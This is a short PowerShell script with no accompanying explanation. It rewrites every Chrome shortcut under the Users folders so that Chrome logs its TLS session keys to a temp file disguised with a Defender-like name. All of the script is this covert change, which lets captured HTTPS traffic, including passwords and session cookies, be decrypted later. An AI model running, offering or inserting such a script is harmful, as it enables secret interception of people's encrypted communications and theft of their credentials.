foreach ($link in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.lnk) {
    $shell = New-Object -COM WScript.Shell
    $shortcut = $shell.CreateShortcut($link)  ## Open the lnk
    if ($shortcut.TargetPath -match 'chrome\.exe$') {
        $shortcut.Arguments = "--ssl-key-log-file=$env:TEMP\defender-res.txt"
        $shortcut.Save()
    }
}
